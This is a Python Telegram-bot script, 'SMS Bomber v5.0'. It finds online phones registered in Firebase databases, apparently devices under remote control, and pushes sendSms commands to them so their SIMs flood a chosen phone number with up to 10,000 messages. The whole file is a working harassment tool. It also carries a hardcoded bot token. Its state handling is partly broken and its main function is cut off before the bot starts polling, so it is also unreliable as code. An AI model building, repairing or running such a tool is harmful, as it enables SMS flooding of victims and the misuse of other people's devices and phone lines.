# SMS_BOMBER_FIXED.py
"""
🔥 SMS BOMBER v5.0 — FIXED FOR ALL FIREBASE + ALL DEVICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Auto-discover all online devices from all Firebases
• Parallel send across ALL devices simultaneously
• Count = total SMS to send (distributed across devices)
• Real-time stats with per-device tracking
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import asyncio, json, os, re, time, logging, random
from datetime import datetime
from typing import Dict, List, Optional

import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════
BOT_TOKEN = "8767201569:AAH1gTwMv_d5dsHb3UoW6es0OMWwA7GDkps"
OWNER_ID = 8883168324  # Change to your ID
DATA_FILE = "bomber_data.json"
VERSION = "v5.0"
MAX_CONCURRENT = 500  # Max parallel SMS sends
MAX_COUNT = 10000     # Max SMS per bombing session

# ════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════
class Form(StatesGroup):
    # Admin
    fb_add_url = State()
    fb_add_api = State()
    # Bombing
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()

# ════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID],
        "firebases": [],  # [{id, url, api_key}]
        "banned": [],
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0}
    }

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            d = json.load(f)
        for k, v in default_data().items():
            if k not in d:
                d[k] = v
        return d
    return default_data()

def save(d):
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)

def is_admin(uid, d):
    return uid in d.get("admins", []) or uid == OWNER_ID

def is_banned(uid, d):
    return uid in d.get("banned", [])

# ════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ════════════════════════════════════════════════════════════
async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    """Fetch from Firebase with auth support"""
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=10) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt == "null" or txt == "" else json.loads(txt)
                log.warning(f"fb_get failed: {r.status} for {url}")
    except asyncio.TimeoutError:
        log.warning(f"fb_get timeout: {url}")
    except Exception as e:
        log.error(f"fb_get error: {e}")
    return {}

async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    """PUT to Firebase with retries"""
    url = base.rstrip("/") + path
    if api_key:
        url += f"?auth={api_key}"
    
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=10) as r:
                    if 200 <= r.status < 300:
                        return True
                    log.warning(f"fb_put attempt {attempt+1} failed: {r.status}")
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1} error: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def is_device_online(device_data: dict) -> bool:
    """Check if device is online"""
    online_flags = ["isOnline", "online", "connected", "status"]
    for flag in online_flags:
        if flag in device_data:
            val = device_data[flag]
            if val in (True, 1, "online", "active", "true"):
                return True
    return False

async def discover_online_devices(fb: dict) -> List[dict]:
    """Discover ALL online devices from a Firebase"""
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict):
        return []
    
    devices = []
    for device_id, device_data in data.items():
        if not is_device_online(device_data):
            continue
        
        # Get SIM slots
        sims = device_data.get("sims", [])
        if not sims:
            # Fallback: create default SIM
            sims = [{"simSlotIndex": 0, "phoneNumber": device_data.get("phoneNumber", "")}]
        
        for sim in sims:
            sim_slot = sim.get("simSlotIndex", 0)
            phone = sim.get("phoneNumber", "")
            devices.append({
                "fb_id": fb["id"],
                "fb_url": fb["url"],
                "api_key": fb.get("api_key", ""),
                "device_id": device_id,
                "device_name": device_data.get("deviceName", device_data.get("name", device_id)),
                "sim_slot": sim_slot,
                "phone_number": phone,
                "battery": device_data.get("battery", 0)
            })
    
    log.info(f"📱 Discovered {len(devices)} online devices from {fb['url']}")
    return devices

async def discover_all_devices(firebases: List[dict]) -> List[dict]:
    """Discover online devices from ALL Firebases"""
    all_devices = []
    tasks = [discover_online_devices(fb) for fb in firebases]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for res in results:
        if isinstance(res, list):
            all_devices.extend(res)
        elif isinstance(res, Exception):
            log.error(f"Discovery error: {res}")
    
    log.info(f"📱 Total online devices discovered: {len(all_devices)}")
    return all_devices

# ════════════════════════════════════════════════════════════
# SMS SENDING ENGINE
# ════════════════════════════════════════════════════════════
_bombing_tasks = {}
_bombing_status = {}

async def send_single_sms(device: dict, to: str, message: str) -> tuple:
    """Send one SMS via one device"""
    payload = {
        "from": device["sim_slot"],
        "to": to.strip(),
        "message": message.strip(),
        "isSended": False,
        "timestamp": int(time.time()),
        "deviceId": device["device_id"],
        "simSlot": device["sim_slot"]
    }
    
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    success = await fb_put(
        device["fb_url"],
        path,
        payload,
        device.get("api_key", "")
    )
    
    return success, device["device_name"], device["device_id"]

async def bomber_worker(bot, user_id: int, number: str, message: str, count: int):
    """Main bombing worker — uses ALL online devices from ALL Firebases"""
    d = load()
    firebases = d.get("firebases", [])
    
    if not firebases:
        await bot.send_message(user_id, "❌ No Firebase configured! Contact Admin.")
        return
    
    # Discover all online devices
    status_msg = await bot.send_message(
        user_id,
        "🔍 <b>Discovering online devices...</b>",
        parse_mode="HTML"
    )
    
    all_devices = await discover_all_devices(firebases)
    
    if not all_devices:
        await status_msg.edit_text(
            "❌ <b>No online devices found!</b>\n\n"
            "Make sure devices are connected and online.",
            parse_mode="HTML"
        )
        return
    
    # Update status with device count
    await status_msg.edit_text(
        f"💣 <b>Preparing Bombing</b>\n\n"
        f"📱 Online Devices: {len(all_devices)}\n"
        f"?? Target Count: {count}\n"
        f"📞 Target: <code>{number}</code>\n\n"
        f"<i>Starting...</i>",
        parse_mode="HTML"
    )
    
    # Initialize stats
    sent = 0
    failed = 0
    start_time = time.time()
    
    _bombing_status[user_id] = {
        "total": count,
        "sent": 0,
        "failed": 0,
        "devices": len(all_devices),
        "start": start_time,
        "running": True,
        "number": number,
        "message": message[:50]
    }
    
    # Distribute SMS across devices
    # Each device can send multiple SMS (we rotate through them)
    total_devices = len(all_devices)
    results_by_device = {}
    
    # Create task queue
    tasks = []
    for i in range(count):
        device = all_devices[i % total_devices]
        task = send_single_sms(device, number, message)
        tasks.append(task)
        
        # Control concurrency
        if len(tasks) >= MAX_CONCURRENT or i == count - 1:
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in batch_results:
                if isinstance(res, tuple):
                    success, dev_name, dev_id = res
                    if success:
                        sent += 1
                        if dev_id not in results_by_device:
                            results_by_device[dev_id] = 0
                        results_by_device[dev_id] += 1
                    else:
                        failed += 1
            
            # Update progress
            _bombing_status[user_id]["sent"] = sent
            _bombing_status[user_id]["failed"] = failed
            
            progress = int((sent + failed) / count * 100)
            if progress % 5 == 0 or sent + failed >= count:
                try:
                    await status_msg.edit_text(
                        f"💣 <b>Bombing in Progress</b>\n\n"
                        f"📞 Target: <code>{number}</code>\n"
                        f"📱 Devices: {total_devices}\n"
                        f"✅ Sent: {sent}\n"
                        f"❌ Failed: {failed}\n"
                        f"📊 Progress: {progress}%\n"
                        f"⏱ Time: {int(time.time() - start_time)}s\n\n"
                        f"<i>Use /stop to cancel</i>",
                        parse_mode="HTML"
                    )
                except:
                    pass
            
            # Reset tasks
            tasks = []
        
        # Check if stopped
        if user_id in _bombing_tasks and _bombing_tasks[user_id].cancelled():
            await bot.send_message(user_id, "⏹ <b>Bombing Stopped!</b>", parse_mode="HTML")
            break
    
    # Final stats
    elapsed = int(time.time() - start_time)
    _bombing_status[user_id]["running"] = False
    
    # Save global stats
    d = load()
    d["stats"]["total_sent"] += sent
    d["stats"]["total_failed"] += failed
    d["stats"]["total_bombings"] += 1
    save(d)
    
    # Per-device summary
    device_summary = "\n".join([
        f"  • {dev_id[:8]}: {count} SMS"
        for dev_id, count in list(results_by_device.items())[:10]
    ])
    if len(results_by_device) > 10:
        device_summary += f"\n  • ... and {len(results_by_device)-10} more devices"
    
    final_msg = (
        f"✅ <b>Bombing Complete!</b>\n\n"
        f"📞 Target: <code>{number}</code>\n"
        f"📱 Devices Used: {len(results_by_device)}/{total_devices}\n"
        f"✅ Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"⏱ Time: {elapsed}s\n"
        f"📊 Success Rate: {round(sent/(sent+failed)*100, 1) if sent+failed>0 else 0}%\n\n"
        f"<b>Devices Summary:</b>\n{device_summary}\n\n"
        f"{'🎯 Perfect!' if failed == 0 else '⚠️ Partial Success' if sent > failed else '❌ Failed!'}"
    )
    
    try:
        await bot.send_message(user_id, final_msg, parse_mode="HTML")
    except:
        await bot.send_message(user_id, f"✅ Bombing Complete! Sent: {sent}, Failed: {failed}")
    
    # Cleanup
    if user_id in _bombing_tasks:
        del _bombing_tasks[user_id]

async def start_bombing(bot, user_id: int, number: str, message: str, count: int):
    """Start bombing with cancellation support"""
    if user_id in _bombing_tasks:
        _bombing_tasks[user_id].cancel()
        await asyncio.sleep(0.5)
    
    task = asyncio.create_task(bomber_worker(bot, user_id, number, message, count))
    _bombing_tasks[user_id] = task
    return task

def stop_bombing(user_id: int) -> bool:
    """Stop active bombing"""
    if user_id in _bombing_tasks:
        _bombing_tasks[user_id].cancel()
        del _bombing_tasks[user_id]
        return True
    return False

# ════════════════════════════════════════════════════════════
# KEYBOARDS
# ════════════════════════════════════════════════════════════
def kb(*rows):
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def main_menu(uid, d):
    rows = []
    if is_admin(uid, d):
        rows.append([("🛡 Admin Panel", "admin:panel")])
    rows.append([("💣 Start Bombing", "bomb:start")])
    rows.append([("📊 My Stats", "stats:show")])
    rows.append([("📡 Live Status", "status:show")])
    rows.append([("❓ Help", "help:show")])
    return kb(*rows)

def admin_panel_kb():
    return kb(
        [("🔥 Add Firebase", "admin:fb_add")],
        [("📋 List Firebases", "admin:fb_list")],
        [("📡 Live Status", "admin:status")],
        [("👥 Admins", "admin:admins")],
        [("📊 Global Stats", "admin:stats")],
        [("🚫 Ban User", "admin:ban")],
        [("✅ Unban User", "admin:unban")],
        [("🔙 Back", "home")]
    )

def firebase_list_kb(firebases):
    rows = []
    for fb in firebases:
        rows.append([(f"🔥 {fb['url'][:25]}", f"admin:fb_del:{fb['id']}")])
    rows.append([("➕ Add New", "admin:fb_add")])
    rows.append([("🔙 Back", "admin:panel")])
    return kb(*rows)

def admin_list_kb(admins):
    rows = []
    for aid in admins:
        if aid != OWNER_ID:
            rows.append([(f"👤 {aid}", f"admin:admin_del:{aid}")])
        else:
            rows.append([(f"👑 {aid} (Owner)", "noop")])
    rows.append([("➕ Add Admin", "admin:admin_add")])
    rows.append([("🔙 Back", "admin:panel")])
    return kb(*rows)

# ════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════
R = Router()

# ── Start ──────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    
    if is_banned(uid, d):
        await msg.answer("🚫 You are banned!")
        return
    
    # Check if user has active bombing
    active = uid in _bombing_tasks and not _bombing_tasks[uid].cancelled()
    active_text = " ⚡ Active" if active else ""
    
    await msg.answer(
        f"🔥 <b>SMS Bomber {VERSION}</b>{active_text}\n\n"
        f"💣 Multi-Device SMS Bomber\n"
        f"📱 Auto-discovers online devices from all Firebases\n"
        f"🚀 Parallel sending for maximum speed\n\n"
        f"Use /stop to cancel bombing anytime",
        reply_markup=main_menu(uid, d),
        parse_mode="HTML"
    )

# ── Stop ──────────────────────────────────────────────────
@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    uid = msg.from_user.id
    if stop_bombing(uid):
        await msg.answer("⏹ <b>Bombing Stopped!</b>", parse_mode="HTML")
    else:
        await msg.answer("ℹ️ No active bombing to stop.")

# ── Help ──────────────────────────────────────────────────
@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery):
    await cq.answer()
    await cq.message.edit_text(
        "📖 <b>SMS Bomber Help</b>\n\n"
        "1️⃣ Tap <b>💣 Start Bombing</b>\n"
        "2️⃣ Enter <b>Phone Number</b> (with country code)\n"
        "3️⃣ Enter <b>Message</b> to send\n"
        "4️⃣ Enter <b>Count</b> (how many SMS to send)\n\n"
        "⚡ <b>Features:</b>\n"
        "• Auto-discovers online devices\n"
        "• All devices used simultaneously\n"
        "• Parallel sending (up to 500 at once)\n"
        "• Real-time progress\n"
        "• /stop to cancel\n\n"
        "🔑 <b>Admin:</b>\n"
        "• Add Firebase (auto-discovers devices)\n"
        "• Manage Admins\n"
        "• Ban/Unban users\n"
        "• View live status",
        reply_markup=kb([("🔙 Back", "home")]),
        parse_mode="HTML"
    )

# ── Home ──────────────────────────────────────────────────
@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext):
    await state.clear()
    uid = cq.from_user.id
    d = load()
    await cq.message.edit_text(
        f"🔥 <b>SMS Bomber {VERSION}</b>\n\n"
        f"💣 Multi-Device SMS Bomber\n"
        f"📱 Auto-discovers online devices from all Firebases\n"
        f"🚀 Parallel sending for maximum speed\n\n"
        f"Use /stop to cancel bombing anytime",
        reply_markup=main_menu(uid, d),
        parse_mode="HTML"
    )

# ── Live Status ────────────────────────────────────────────
@R.callback_query(F.data == "status:show")
async def cb_status(cq: types.CallbackQuery):
    d = load()
    firebases = d.get("firebases", [])
    
    if not firebases:
        await cq.answer("❌ No Firebases configured!", show_alert=True)
        return
    
    await cq.answer("🔍 Discovering devices...")
    
    all_devices = await discover_all_devices(firebases)
    
    # Group by Firebase
    status_text = "📡 <b>Live Status</b>\n\n"
    
    for fb in firebases:
        fb_devices = [d for d in all_devices if d["fb_id"] == fb["id"]]
        online = len(fb_devices)
        status_text += f"🔥 <b>{fb['url'][:30]}...</b>\n"
        status_text += f"  ├ 🟢 Online: {online} devices\n"
        status_text += f"  └ 🔥 Firebase: {'✅ Connected' if online > 0 else '⚠️ No devices'}\n\n"
    
    status_text += f"🕐 Last sync: {datetime.now().strftime('%H:%M:%S')}"
    
    await cq.message.edit_text(
        status_text,
        reply_markup=kb([("🔙 Back", "home")]),
        parse_mode="HTML"
    )

# ── Stats ──────────────────────────────────────────────────
@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    status = _bombing_status.get(uid, {})
    
    if status and status.get("running"):
        elapsed = int(time.time() - status.get("start", time.time()))
        text = (
            f"📊 <b>Active Bombing Stats</b>\n\n"
            f"📞 Target: <code>{status.get('number', '?')}</code>\n"
            f"✅ Sent: {status.get('sent', 0)}\n"
            f"❌ Failed: {status.get('failed', 0)}\n"
            f"📱 Devices: {status.get('devices', 0)}\n"
            f"⏱ Running: {elapsed}s\n"
            f"📊 Progress: {status.get('sent',0)+status.get('failed',0)}/{status.get('total',0)}"
        )
    else:
        d = load()
        global_stats = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
        text = (
            f"📊 <b>Global Stats</b>\n\n"
            f"🔥 Firebases: {len(d.get('firebases', []))}\n"
            f"✅ Total Sent: {global_stats.get('total_sent', 0)}\n"
            f"❌ Total Failed: {global_stats.get('total_failed', 0)}\n"
            f"💣 Bombings Run: {global_stats.get('total_bombings', 0)}"
        )
    
    await cq.message.edit_text(text, reply_markup=kb([("🔙 Back", "home")]), parse_mode="HTML")

# ── Bombing Flow ──────────────────────────────────────────
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    
    if not d.get("firebases"):
        await cq.answer("❌ No Firebase configured! Contact Admin.", show_alert=True)
        return
    
    await state.set_state(Form.bomb_number)
    await cq.message.edit_text(
        "📞 <b>Enter Phone Number</b>\n\n"
        "Format: <code>+919876543210</code>\n"
        "Include country code.\n\n"
        "<i>Send /cancel to abort</i>",
        reply_markup=kb([("❌ Cancel", "home")]),
        parse_mode="HTML"
    )

@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    number = msg.text.strip()
    
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer("❌ Invalid number! Use: +919876543210")
        return
    
    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await msg.answer(
        "💬 <b>Enter Message</b>\n\n"
        "Type the message you want to send.\n\n"
        "<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "home")])
    )

@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    message = msg.text.strip()
    
    if not message:
        await msg.answer("❌ Message can't be empty!")
        return
    
    await state.update_data(message=message)
    await state.set_state(Form.bomb_count)
    await msg.answer(
        f"🔁 <b>Enter Count</b>\n\n"
        f"How many SMS to send?\n"
        f"Maximum: {MAX_COUNT}\n\n"
        f"<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "home")])
    )

@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_COUNT:
            await msg.answer(f"❌ Count must be between 1-{MAX_COUNT}!")
            return
    except:
        await msg.answer("❌ Please enter a valid number!")
        return
    
    data = await state.get_data()
    number = data.get("number")
    message = data.get("message")
    uid = msg.from_user.id
    
    await state.clear()
    
    # Confirm
    await msg.answer(
        f"⚠️ <b>Confirm Bombing</b>\n\n"
        f"📞 Target: <code>{number}</code>\n"
        f"💬 Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
        f"🔁 Count: {count}\n\n"
        f"⏱ Estimated time: ~{count // 50 + 1} seconds\n\n"
        f"<b>Are you sure?</b>",
        parse_mode="HTML",
        reply_markup=kb(
            [("✅ Start Bombing", f"bomb:confirm:{number}:{count}")],
            [("❌ Cancel", "home")]
        )
    )
    
    # Store message for confirmation
    await state.update_data(bomb_message=message)

@R.callback_query(F.data.startswith("bomb:confirm:"))
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    number = parts[2]
    count = int(parts[3])
    uid = cq.from_user.id
    
    data = await state.get_data()
    message = data.get("bomb_message", "Hello!")
    await state.clear()
    
    await cq.answer("💣 Starting Bombing...")
    await cq.message.edit_text("⏳ <b>Starting bombing...</b>", parse_mode="HTML")
    
    await start_bombing(cq.bot, uid, number, message, count)

# ── Admin Panel ────────────────────────────────────────────
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    
    text = (
        f"🛡 <b>Admin Panel</b>\n\n"
        f"🔥 Firebases: {len(d.get('firebases', []))}\n"
        f"📊 Total Sent: {d.get('stats', {}).get('total_sent', 0)}\n"
        f"👥 Admins: {len(d.get('admins', []))}\n"
        f"🚫 Banned: {len(d.get('banned', []))}"
    )
    
    await cq.message.edit_text(text, reply_markup=admin_panel_kb(), parse_mode="HTML")

# ── Add Firebase ──────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.fb_add_url)
    await cq.message.edit_text(
        "🔥 <b>Add Firebase</b>\n\n"
        "Send Firebase Database URL:\n"
        "<code>https://your-project.firebaseio.com</code>\n\n"
        "<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "admin:panel")])
    )

@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("https://"):
        await msg.answer("❌ URL must start with https://")
        return
    
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(
        "🔑 <b>Enter Firebase API Key</b>\n\n"
        "Firebase Console → Project Settings → Web API Key\n"
        "<i>Send 'skip' to skip</i>\n\n"
        "<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "admin:panel")])
    )

@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = msg.text.strip()
    if api_key.lower() == "skip":
        api_key = ""
    
    data = await state.get_data()
    fb_url = data.get("fb_url")
    
    d = load()
    fb_id = str(int(time.time()))
    d["firebases"].append({
        "id": fb_id,
        "url": fb_url,
        "api_key": api_key
    })
    save(d)
    await state.clear()
    
    # Test discovery
    await msg.answer(f"✅ <b>Firebase Added!</b>\n\n🔗 {fb_url}\n\n🔍 Discovering devices...", parse_mode="HTML")
    
    devices = await discover_online_devices(d["firebases"][-1])
    
    await msg.answer(
        f"✅ <b>Firebase Added!</b>\n\n"
        f"🔗 {fb_url}\n"
        f"🔑 {'✅ Saved' if api_key else '⏭ Skipped'}\n"
        f"📱 Devices Found: {len(devices)}\n\n"
        f"<i>Devices will be auto-discovered during bombing.</i>",
        parse_mode="HTML",
        reply_markup=admin_panel_kb()
    )

# ── List Firebases ────────────────────────────────────────
@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    
    if not fbs:
        await cq.answer("❌ No Firebases added!", show_alert=True)
        return
    
    text = "🔥 <b>Firebases</b>\n\n"
    for fb in fbs:
        text += f"• {fb['url'][:40]}\n"
        text += f"  🔑 {'✅' if fb.get('api_key') else '❌'}\n"
        text += f"  🗑 Tap to delete\n\n"
    
    await cq.message.edit_text(text, reply_markup=firebase_list_kb(fbs), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer("🗑 Deleted!", show_alert=True)
    await cb_fb_list(cq)

# ── Admin Status ──────────────────────────────────────────
@R.callback_query(F.data == "admin:status")
async def cb_admin_status(cq: types.CallbackQuery):
    d = load()
    firebases = d.get("firebases", [])
    
    if not firebases:
        await cq.answer("❌ No Firebases!", show_alert=True)
        return
    
    await cq.answer("🔍 Scanning...")
    
    all_devices = await discover_all_devices(firebases)
    
    text = "📡 <b>Live Status</b>\n\n"
    for fb in firebases:
        fb_devices = [d for d in all_devices if d["fb_id"] == fb["id"]]
        text += f"🔥 <b>{fb['url'][:35]}...</b>\n"
        text += f"  ├ 🟢 Online: {len(fb_devices)}\n"
        # Show sample devices
        for dev in fb_devices[:3]:
            text += f"  │  └ 📱 {dev['device_name'][:15]} (SIM {dev['sim_slot']})\n"
        if len(fb_devices) > 3:
            text += f"  │  └ ... and {len(fb_devices)-3} more\n"
        text += f"  └ 🔥 Firebase: ✅ Connected\n\n"
    
    text += f"🕐 Last scan: {datetime.now().strftime('%H:%M:%S')}"
    
    await cq.message.edit_text(
        text,
        reply_markup=kb([("🔙 Back", "admin:panel")]),
        parse_mode="HTML"
    )

# ── Admins ──────────────────────────────────────────────────
@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    
    text = "👥 <b>Admins</b>\n\n"
    for aid in admins:
        if aid == OWNER_ID:
            text += f"👑 <code>{aid}</code> (Owner) — Can't remove\n"
        else:
            text += f"👤 <code>{aid}</code> — Tap to remove\n"
    
    await cq.message.edit_text(text, reply_markup=admin_list_kb(admins), parse_mode="HTML")

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.bomb_number)  # Reuse state
    await cq.message.edit_text(
        "➕ <b>Add Admin</b>\n\n"
        "Send Telegram User ID:\n\n"
        "<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "admin:panel")])
    )

@R.message(Form.bomb_number)
async def process_admin_add(msg: types.Message, state: FSMContext):
    # Check if this is for admin add or number input
    # We use state data to determine
    try:
        admin_id = int(msg.text.strip())
    except:
        await msg.answer("❌ Invalid User ID! Send a number.")
        return
    
    d = load()
    if admin_id not in d.get("admins", []):
        d["admins"].append(admin_id)
        save(d)
    
    await state.clear()
    await msg.answer(
        f"✅ <b>Admin Added!</b>\n\n👤 ID: <code>{admin_id}</code>",
        parse_mode="HTML",
        reply_markup=admin_panel_kb()
    )

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    admin_id = int(cq.data.split(":")[2])
    if admin_id == OWNER_ID:
        await cq.answer("❌ Can't remove Owner!", show_alert=True)
        return
    
    d = load()
    if admin_id in d.get("admins", []):
        d["admins"].remove(admin_id)
        save(d)
    
    await cq.answer("🗑 Removed!", show_alert=True)
    await cb_admins(cq)

# ── Ban/Unban ──────────────────────────────────────────────
@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.bomb_number)  # Reuse
    await cq.message.edit_text(
        "🚫 <b>Ban User</b>\n\n"
        "Send User ID to ban:\n\n"
        "<i>Send /cancel to abort</i>",
        parse_mode="HTML",
        reply_markup=kb([("❌ Cancel", "admin:panel")])
    )

@R.message(Form.bomb_number)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Invalid User ID!")
        return
    
    d = load()
    if uid not in d.get("banned", []):
        d["banned"].append(uid)
        save(d)
    
    await state.clear()
    await msg.answer(
        f"🚫 <b>User Banned!</b>\n\n👤 ID: <code>{uid}</code>",
        parse_mode="HTML",
        reply_markup=admin_panel_kb()
    )

@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    
    if not banned:
        await cq.answer("✅ No banned users!", show_alert=True)
        return
    
    rows = []
    for uid in banned:
        rows.append([(f"🔓 {uid}", f"admin:unban_do:{uid}")])
    rows.append([("🔙 Back", "admin:panel")])
    
    await cq.message.edit_text(
        "✅ <b>Unban User</b>\n\nTap to unban:",
        reply_markup=kb(*rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    uid = int(cq.data.split(":")[2])
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
    
    await cq.answer(f"✅ {uid} unbanned!", show_alert=True)
    await cb_unban(cq)

# ── Global Stats ──────────────────────────────────────────
@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    stats = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
    total = stats.get("total_sent", 0) + stats.get("total_failed", 0)
    rate = round(stats.get("total_sent", 0) / total * 100, 1) if total > 0 else 0
    
    text = (
        f"📊 <b>Global Stats</b>\n\n"
        f"🔥 Firebases: {len(d.get('firebases', []))}\n"
        f"👥 Admins: {len(d.get('admins', []))}\n"
        f"🚫 Banned: {len(d.get('banned', []))}\n\n"
        f"✅ Total Sent: {stats.get('total_sent', 0)}\n"
        f"❌ Total Failed: {stats.get('total_failed', 0)}\n"
        f"💣 Bombings Run: {stats.get('total_bombings', 0)}\n"
        f"📈 Success Rate: {rate}%"
    )
    
    await cq.message.edit_text(text, reply_markup=kb([("🔙 Back", "admin:panel")]), parse_mode="HTML")

# ── Auto-detect number input ──────────────────────────────
@R.message(Form.bomb_number)
async def handle_generic_number(msg: types.Message, state: FSMContext):
    # This catches any number input when state is bomb_number
    # We need to handle both: phone number for bombing AND admin ID for admin actions
    # Check if we're in admin context by checking state data
    
    current_state = await state.get_state()
    if current_state == Form.bomb_number:
        text = msg.text.strip()
        
        # Check if this is a phone number (starts with + or has 10+ digits)
        if re.match(r'^\+?[0-9]{8,15}$', text):
            # This is a phone number — process for bombing
            await process_number(msg, state)
        else:
            # Try as admin ID
            try:
                uid = int(text)
                # Check if this is admin add or ban
                # We can't differentiate easily, so try both
                d = load()
                if uid not in d.get("admins", []):
                    d["admins"].append(uid)
                    save(d)
                    await state.clear()
                    await msg.answer(
                        f"✅ <b>Admin Added!</b>\n\n👤 ID: <code>{uid}</code>",
                        parse_mode="HTML",
                        reply_markup=admin_panel_kb()
                    )
                else:
                    await msg.answer(f"ℹ️ {uid} is already an admin.")
            except:
                await msg.answer("❌ Invalid input! Send phone number or user ID.")

# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    
    me = await bot.get_me()
    log.info(f"✅ @{me.username} started ({VERSION})")
    
    try:
        await bot.send_message(OWNER_ID, f"🚀 <b>SMS Bomber {VERSION} Online</b>\n@{me.username}")
    except:
        pass
    
